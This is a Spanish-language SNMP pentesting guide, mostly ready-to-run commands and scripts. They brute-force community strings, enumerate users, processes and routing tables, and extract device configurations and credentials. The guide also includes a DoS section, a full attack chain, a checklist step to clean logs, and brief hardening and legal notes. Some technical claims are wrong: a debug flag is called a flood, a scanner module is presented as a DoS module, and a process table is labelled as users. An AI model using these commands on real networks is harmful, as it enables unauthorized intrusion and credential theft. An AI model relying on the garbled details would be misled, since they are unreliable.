# 🔍 **SNMP (Puerto 161)**

## **¿Qué es SNMP y por qué es importante?**

**SNMP (Simple Network Management Protocol)** es un protocolo que permite **monitorear y gestionar dispositivos de red**. Es uno de los **vectores de ataque más comunes** porque:

### **Problemas de Seguridad Típicos:**
- ✅ Configuraciones por defecto con **community strings públicas**
- ✅ **Información sensible** expuesta (usuarios, configuraciones, redes)
- ✅ Posibilidad de **modificar configuraciones** (si está mal configurado)
- ✅ **Enumeración de red completa** desde un solo punto

---

## 🎯 **Fases de Ataque SNMP**

### **Fase 1: Reconocimiento y Descubrimiento**

#### **1. Identificar dispositivos SNMP:**
```bash
# Escaneo básico de puerto 161
nmap -sU -p 161 192.168.1.0/24

# Escaneo más agresivo
sudo nmap -sU -p 161 --open --max-retries 1 -T4 192.168.1.0/24

# Usar scripts NSE de SNMP
nmap -sU -p 161 --script snmp-info 192.168.1.100
```

#### **2. Detectar versión SNMP:**
```bash
nmap -sU -p 161 --script snmp-sysdescr 192.168.1.100
```
**Salida típica:**
```
| snmp-sysdescr: 
|   Cisco IOS Software, C3560 Software (C3560-ADVIPSERVICESK9-M), Version 12.2(55)SE7, RELEASE SOFTWARE (fc1)
|   Technical Support: http://www.cisco.com/techsupport
|_  System uptime: 100 days, 10:35:12.00
```

---

## 🔑 **Fase 2: Enumeración de Community Strings**

### **¿Qué son Community Strings?**
Son **contraseñas SNMP** en texto claro:
- **`public`** → Solo lectura (RO)
- **`private`** → Lectura/Escritura (RW)
- Otras comunes: `internal`, `secret`, `admin`, `cisco`, etc.

### **Métodos de Enumeración:**

#### **1. Fuerza Bruta con onesixtyone:**
```bash
# Instalar si no está
sudo apt install onesixtyone

# Diccionario simple
echo "public
private
internal
secret
admin
cisco
manager" > community.txt

# Ataque
onesixtyone -c community.txt 192.168.1.100

# Múltiples hosts
onesixtyone -c community.txt -i hosts.txt
```

#### **2. Snmpwalk para probar:**
```bash
# Probar community strings manualmente
snmpwalk -v 2c -c public 192.168.1.100
snmpwalk -v 2c -c private 192.168.1.100

# Probar con timeout reducido
snmpwalk -v 2c -c public 192.168.1.100 -t 2
```

#### **3. Con Metasploit:**
```bash
msfconsole
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.100
set RPORT 161
set VERSION 2c
set COMMUNITIES_FILE /usr/share/wordlists/snmp_communities.txt
run
```

#### **4. Con nmap scripts:**
```bash
# Enumerar community strings
nmap -sU -p 161 --script snmp-brute 192.168.1.100

# Con diccionario personalizado
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=my_communities.txt 192.168.1.100
```

---

## 📊 **Fase 3: Extracción de Información**

### **Comandos Esenciales de snmpwalk:**

#### **Información del Sistema:**
```bash
# Información básica del sistema
snmpwalk -v 2c -c public 192.168.1.100 system

# Nombre del sistema
snmpwalk -v 2c -c public 192.168.1.100 sysName.0

# Descripción del sistema
snmpwalk -v 2c -c public 192.168.1.100 sysDescr.0

# Tiempo de actividad
snmpwalk -v 2c -c public 192.168.1.100 sysUpTime.0

# Información de contacto
snmpwalk -v 2c -c public 192.168.1.100 sysContact.0

# Ubicación
snmpwalk -v 2c -c public 192.168.1.100 sysLocation.0
```

#### **Información de Red:**
```bash
# Tabla ARP
snmpwalk -v 2c -c public 192.168.1.100 ipNetToMediaTable

# Tabla de routing
snmpwalk -v 2c -c public 192.168.1.100 ipRouteTable

# Interfaces de red
snmpwalk -v 2c -c public 192.168.1.100 ifTable

# Tabla de direcciones IP
snmpwalk -v 2c -c public 192.168.1.100 ipAddrTable
```

#### **Información de Usuarios:**
```bash
# Usuarios en sistemas Unix/Linux
snmpwalk -v 2c -c public 192.168.1.100 hrSWRunName

# Tabla de procesos
snmpwalk -v 2c -c public 192.168.1.100 hrSWRunTable

# Usuarios en Windows
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.4.1.77.1.2.25
```

#### **Información Específica de Dispositivos:**

**Cisco:**
```bash
# Configuración Cisco
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.4.1.9

# Tablas de VLAN
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.4.1.9.9.46

# CDP neighbors
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.4.1.9.9.23
```

**Windows:**
```bash
# Información de Windows
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.4.1.77

# Usuarios Windows
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.4.1.77.1.2.25

# Servicios Windows
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.4.1.77.1.2.3.1.1
```

---

## 🛠️ **Fase 4: Herramientas Automáticas**

### **1. snmp-check**
```bash
# Instalación
sudo apt install snmp-check

# Uso básico
snmp-check 192.168.1.100

# Con community string específica
snmp-check -c public 192.168.1.100

# Con versión específica
snmp-check -c public -v 2c 192.168.1.100

# Exportar a HTML
snmp-check -c public 192.168.1.100 -o snmp_report.html
```

### **2. Metasploit Modules:**
```bash
msfconsole

# Enum SNMP
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.100
set COMMUNITY public
run

# Enumerar hosts Windows
use auxiliary/scanner/snmp/snmp_enumshares
use auxiliary/scanner/snmp/snmp_enumusers
```

### **3. Python con pysnmp:**
```python
from pysnmp.hlapi import *

# Script para enumerar OIDs
def snmp_walk(target, community, oid):
    iterator = nextCmd(
        SnmpEngine(),
        CommunityData(community),
        UdpTransportTarget((target, 161)),
        ContextData(),
        ObjectType(ObjectIdentity(oid)),
        lexicographicMode=False
    )
    
    for errorIndication, errorStatus, errorIndex, varBinds in iterator:
        if errorIndication:
            print(errorIndication)
            break
        elif errorStatus:
            print('%s at %s' % (errorStatus.prettyPrint(),
                                errorIndex and varBinds[int(errorIndex)-1][0] or '?'))
            break
        else:
            for varBind in varBinds:
                print(' = '.join([x.prettyPrint() for x in varBind]))

# Uso
snmp_walk('192.168.1.100', 'public', '1.3.6.1.2.1')
```

---

## 🎯 **Fase 5: Explotación**

### **1. Extracción de Configuraciones:**
```bash
# Cisco - Intentar extraer config
snmpwalk -v 2c -c private 192.168.1.100 .1.3.6.1.4.1.9.9.96.1.1.1.1.2

# Si RW está habilitado, podríamos modificar configuraciones
snmpwalk -v 2c -c private 192.168.1.100 .1.3.6.1.4.1.9.9.43.1.1.1
```

### **2. Enumeración para Pivoting:**
```bash
# Extraer tabla ARP para descubrir otros hosts
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.2.1.4.22.1.2

# Tabla de routing
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.2.1.4.21
```

### **3. Credenciales y Hashes:**
```bash
# Buscar configuraciones que puedan contener credenciales
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.4.1.9.2

# Para impresoras HP, pueden tener credenciales FTP
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.4.1.11.2.3.9.1
```

### **4. Denegación de Servicio (DoS):**
```bash
# ⚠️ SOLO PARA TESTING EN ENTORNOS CONTROLADOS ⚠️
# Flood SNMP
onesixtyone -d -c community.txt 192.168.1.100

# Con Metasploit
use auxiliary/dos/snmp/snmp_enum
set COMMUNITY public
set VERSION 2c
set RHOST 192.168.1.100
run
```

---

## 📋 **Fase 6: Post-Explotación y Pivoting**

### **1. Mapeo de Red desde SNMP:**
```bash
# Script completo para mapeo
#!/bin/bash
TARGET=$1
COMMUNITY=$2

echo "=== SNMP Network Discovery on $TARGET ==="
echo "1. ARP Table:"
snmpwalk -v 2c -c $COMMUNITY $TARGET .1.3.6.1.2.1.4.22.1.2

echo "2. Routing Table:"
snmpwalk -v 2c -c $COMMUNITY $TARGET .1.3.6.1.2.1.4.21

echo "3. TCP Connections:"
snmpwalk -v 2c -c $COMMUNITY $TARGET .1.3.6.1.2.1.6.13.1.3
```

### **2. Extraer Información para Ataques Posteriores:**
```bash
# Usuarios para ataques de fuerza bruta
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.4.1.77.1.2.25 | grep -oP 'STRING: "\K[^"]+' > users.txt

# Servicios ejecutándose
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.2.1.25.4.2.1.2
```

---

## 🛡️ **Fase 7: Herramientas y Scripts Avanzados**

### **1. Snmpenum (Perl):**
```bash
# Descargar y usar
wget https://raw.githubusercontent.com/needmorecowbell/snmpenum/master/snmpenum.pl
perl snmpenum.pl 192.168.1.100 public linux.txt
```

### **2. SNMP Auditor (Python):**
```python
#!/usr/bin/env python3
import sys
from pysnmp.hlapi import *

def snmp_audit(target, community_file):
    with open(community_file, 'r') as f:
        communities = [line.strip() for line in f]
    
    for community in communities:
        print(f"\n[+] Probando community: {community}")
        try:
            iterator = getCmd(
                SnmpEngine(),
                CommunityData(community),
                UdpTransportTarget((target, 161), timeout=2.0, retries=0),
                ContextData(),
                ObjectType(ObjectIdentity('1.3.6.1.2.1.1.1.0'))
            )
            
            errorIndication, errorStatus, errorIndex, varBinds = next(iterator)
            
            if errorIndication:
                continue
            elif errorStatus:
                continue
            else:
                print(f"[+] Community válida: {community}")
                for varBind in varBinds:
                    print(f"    System: {varBind[1]}")
                return community
        except:
            continue
    
    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Uso: {sys.argv[0]} <target> <community_file>")
        sys.exit(1)
    
    valid_community = snmp_audit(sys.argv[1], sys.argv[2])
    if valid_community:
        print(f"\n[+] Community string encontrada: {valid_community}")
    else:
        print("\n[-] No se encontraron community strings válidas")
```

### **3. Automatización con Nmap:**
```bash
#!/bin/bash
# snmp_audit.sh
TARGET=$1

echo "[*] Escaneando SNMP en $TARGET"
echo "[*] Paso 1: Descubrimiento"
nmap -sU -p 161 --open -oN snmp_discovery.txt $TARGET

echo "[*] Paso 2: Fuerza bruta community strings"
nmap -sU -p 161 --script snmp-brute -oN snmp_brute.txt $TARGET

echo "[*] Paso 3: Enumeración con community pública"
for host in $(grep "161/udp open" snmp_discovery.txt | cut -d" " -f2); do
    echo "[+] Enumerando $host"
    snmpwalk -v 2c -c public $host system > "snmp_${host}_info.txt"
    snmpwalk -v 2c -c public $host ifTable >> "snmp_${host}_info.txt"
done
```

---

## 📊 **Tabla de OIDs Importantes**

| OID | Descripción | Información Obtenida |
|-----|------------|---------------------|
| **1.3.6.1.2.1.1.1** | sysDescr | Descripción del sistema |
| **1.3.6.1.2.1.1.5** | sysName | Nombre del dispositivo |
| **1.3.6.1.2.1.1.6** | sysLocation | Ubicación física |
| **1.3.6.1.2.1.2.2** | ifTable | Tabla de interfaces |
| **1.3.6.1.2.1.4.22** | ipNetToMediaTable | Tabla ARP |
| **1.3.6.1.2.1.25.4.2** | hrSWRunTable | Procesos ejecutándose |
| **1.3.6.1.4.1.77.1.2.25** | Windows users | Usuarios Windows |
| **1.3.6.1.4.1.9.9.23** | Cisco CDP | Dispositivos vecinos |

---

## 🛡️ **Fase 8: Hardening y Protección**

### **Recomendaciones de Seguridad:**

#### **1. Configuración Segura:**
```bash
# Cambiar community strings por defecto
# Usar strings complejas
# Implementar SNMPv3 con autenticación

# Ejemplo configuración Cisco segura
snmp-server community MyComplexP@ssw0rd RO 10
snmp-server community AnotherP@ssw0rd RW 10
access-list 10 permit 192.168.1.0 0.0.0.255
```

#### **2. SNMPv3 (Recomendado):**
```
# Autenticación y encriptación
snmp-server user admin auth SHA AuthP@ssw0rd priv AES PrivP@ssw0rd
```

#### **3. Restricción de Acceso:**
```bash
# Solo desde IPs específicas
# Solo lectura a menos que sea necesario escritura
# Monitorear logs de acceso SNMP
```

---

## 🎯 **Checklist de Pentesting SNMP**

### **Reconocimiento:**
- [ ] Escanear puerto 161 UDP
- [ ] Identificar versión SNMP (v1, v2c, v3)
- [ ] Determinar tipo de dispositivo

### **Enumeración:**
- [ ] Probar community strings por defecto
- [ ] Fuerza bruta de community strings
- [ ] Enumerar OIDs disponibles

### **Extracción:**
- [ ] Información del sistema
- [ ] Configuraciones de red
- [ ] Usuarios y procesos
- [ ] Información específica del dispositivo

### **Explotación:**
- [ ] Extraer credenciales
- [ ] Mapear red interna
- [ ] Identificar vectores de pivoting
- [ ] Modificar configuraciones (si RW disponible)

### **Post-Explotación:**
- [ ] Documentar hallazgos
- [ ] Extraer información para otros ataques
- [ ] Limpiar logs (si es necesario)

---

## ⚠️ **Consideraciones Legales y Éticas**

### **ANTES DE TESTEAR:**
1. ✅ **Permiso por escrito** del propietario
2. ✅ **Ambiente controlado** (laboratorio propio)
3. ✅ **No afectar** producción

### **PELIGROS COMUNES:**
1. ❌ **DoS accidental** por queries agresivas
2. ❌ **Exposición de información** sensible
3. ❌ **Cambios no autorizados** en configuraciones

### **MEJORES PRÁCTICAS:**
```bash
# Usar rate limiting
# Probar en horarios de bajo tráfico
# Documentar todos los comandos ejecutados
# Limitar scope a objetivos autorizados
```

---

## 📚 **Recursos Adicionales**

### **Herramientas:**
- **snmpwalk/snmpget**: Herramientas básicas (paquete `snmp`)
- **onesixtyone**: Fuerza bruta rápida
- **snmp-check**: Enumeración automática
- **Metasploit**: Módulos especializados

### **Diccionarios:**
```bash
# Diccionarios comunes en Kali
/usr/share/wordlists/metasploit/snmp_default_pass.txt
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

### **Documentación:**
- **MIBs comunes**: https://www.oidview.com/mibs/0.html
- **SNMP Security**: https://tools.ietf.org/html/rfc3414
- **Pentesting Guide**: https://book.hacktricks.xyz/pentesting/pentesting-snmp

---

## 🎯 **Ejemplo de Ataque Completo**

```bash
# 1. Descubrimiento
nmap -sU -p 161 --open 192.168.1.0/24 -oN snmp_hosts.txt

# 2. Fuerza bruta community strings
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt -i snmp_hosts.txt -o valid_communities.txt

# 3. Enumeración completa
for line in $(cat valid_communities.txt); do
    ip=$(echo $line | cut -d' ' -f1)
    community=$(echo $line | cut -d' ' -f2)
    echo "[+] Enumerando $ip con $community"
    snmp-check -c $community $ip -o "report_$ip.html"
done

# 4. Extraer información sensible
cat valid_communities.txt | while read ip community; do
    snmpwalk -v 2c -c $community $ip .1.3.6.1.4.1.77.1.2.25 > "users_$ip.txt"
    snmpwalk -v 2c -c $community $ip .1.3.6.1.4.1.9.9.23 > "cdp_$ip.txt"
done
```
